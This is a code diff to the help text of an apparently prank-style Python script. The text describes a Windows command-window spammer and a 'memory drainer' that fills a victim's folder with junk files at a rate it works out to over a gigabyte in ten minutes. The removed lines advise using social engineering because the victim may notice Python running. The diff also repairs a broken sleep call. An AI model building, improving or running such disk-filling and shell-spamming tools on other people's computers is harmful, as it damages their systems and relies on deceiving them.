@@ -75,12 +75,8 @@ def help():
     The spam cmd is a windows only tool which opens the command shell on windows constantly until it is told to stop.
     The most complex one out of the three the memory drainer this makes a file in the directory where the python file is so for example
     if it was to be in documents on their computer it would make a file on documents and fill it with random text normally about 2mb per 2 seconds.
-    Meaning in a minute you have drained 120mb leave it on for 10 min that's 1.2gb you get what Im getting at.
-    Be wary with python they will be able to see that it is running at the bottom as a tab so be wary of that you may need to use a little
-    social engine""")
-    time.sleep      ]
-    ]
-    0)
+    Meaning in a minute you have drained 120mb leave it on for 10 min that's 1.2gb you get what Im getting at.""")
+    time.sleep(20)
     main()
 
 
